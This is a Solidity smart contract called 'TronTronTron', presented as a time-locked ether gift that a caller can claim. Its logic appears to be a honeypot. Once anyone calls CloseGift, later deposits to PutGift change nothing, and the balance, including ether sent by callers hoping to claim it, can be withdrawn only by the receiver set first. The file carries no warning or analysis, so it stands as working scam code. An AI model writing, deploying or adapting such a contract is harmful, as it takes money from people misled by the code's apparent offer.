1 pragma solidity ^0.4.22;
2 
3 contract TronTronTron
4 {
5     address  sender;
6     address  receiver;
7     uint  unlockTime;
8     bool  closed = false;
9     
10  
11     function PutGift(address _receiver) public payable {
12         if( (!closed&&(msg.value >0.10 ether)) || sender==0x0 ) {
13             sender = msg.sender;
14             receiver = _receiver;
15             unlockTime = now;
16         }
17     }
18     
19     function SetGiftTime(uint _unixTime) public {
20         if(msg.sender==sender) {
21             unlockTime = _unixTime;
22         }
23     }
24     
25     function GetGift() public payable {
26         if(receiver==msg.sender&&now>unlockTime) {
27             msg.sender.transfer(address(this).balance);
28         }
29     }
30     
31     function CloseGift() public {
32         if (receiver!=0x0) {
33            closed=true;
34         }
35     }
36     
37     function() public payable{}
38 }